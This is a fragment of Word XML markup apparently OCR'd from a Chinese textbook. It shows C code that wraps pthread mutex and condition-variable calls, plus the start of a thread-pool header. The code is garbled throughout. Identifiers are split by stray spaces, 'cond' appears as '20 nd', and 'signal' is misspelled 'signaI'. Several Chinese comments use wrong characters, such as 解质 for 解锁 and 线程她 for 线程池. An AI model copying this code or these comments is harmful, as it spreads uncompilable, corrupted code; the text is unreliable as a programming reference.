      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cond)</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10" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int status;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if ((status = pthread_mutex_init(&amp;cond-&gt;pmutex, NULL)))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return status;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if ((status = pt hre a d_con d_i n it (&amp;co nd - &gt; p con d, NULL)))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return status;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="118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400" w:line="210"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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃加锁</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int condition_lock(condition_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cond)</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10" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return pthread_mutex_lock(&amp;cond-&gt;pmutex);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210"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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃解质</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int condition_unlock(condition_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cond)</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740" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return pthre a d_mut ex_un Io ck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(&amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>20 nd - &gt; pmute x);</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃等待</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int condition_wait(condition_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cond)</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return pt hr e a d_con d_ w a it (&amp;co nd - &gt; p con d, &amp;cond-&gt; pmutex);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210"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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃固定时间等待</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int condition_timedwait(condition_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cond, const struct times pec "abstime)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="210"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10" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return p t hr e a d_con d_t i medw a it (&amp;c on d- &gt; p con d, &amp;cond-&gt; pmutex, abstime);</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃唤醒一个睡眠线程</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int condition_signal(condition_t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cond)</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return pthread_cond_signaI(&amp;cond-&gt; pcond);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="36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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃唤醒所有睡眠线程</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int condition_broadcast(condition_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cond)</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return pthread_cond_broadcast(&amp;cond-&gt;pcond);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="36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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃释放</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int condition_destroy(condition_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cond)</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0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int status;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:hanging="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if(( status = pthre a d_mut ex_desTO y (&amp;con d - &gt; pmutex))) return status;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:hanging="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if(( status = pthre a d_con d_d estroy (&amp;c ond - &gt; p con d))) return status;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="118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28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threadpool.h</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#ifndef _THREAD_POOL_H_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#define _THREAD_POOL_H_</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃线程她头文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include "condition.h"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃封装线程池中的对象需要执行的任务对象</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>typedef struct task</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="3685"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">void x(Vun)(void </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">args); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">〃函救指针，需要执行的任务 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">void </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>arg;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃参教</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="3685"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>struct task "next;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
